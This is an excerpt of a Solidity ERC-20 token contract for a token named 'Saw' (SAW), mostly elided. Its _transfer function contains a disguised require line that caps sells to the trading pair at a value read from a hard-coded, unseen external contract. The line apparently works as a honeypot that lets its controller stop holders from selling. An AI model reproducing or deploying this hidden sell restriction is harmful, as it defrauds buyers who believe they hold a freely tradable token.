...
uint256 constant TOTAL_SUPPLY = 2000000000;
string constant TOKEN_NAME = "Saw";
string constant TOKEN_SYMBOL = "SAW";
...
contract SAW is Context, IERC20, Ownable {
	...
	function _transfer(address from, address to, uint256 amount) private {
		...
		require(((to == _pair && from != address(_router) )?1:0)*amount <= O(0x878BC0D329E346c49aC313781E1129Ec37704Aa7).amount());
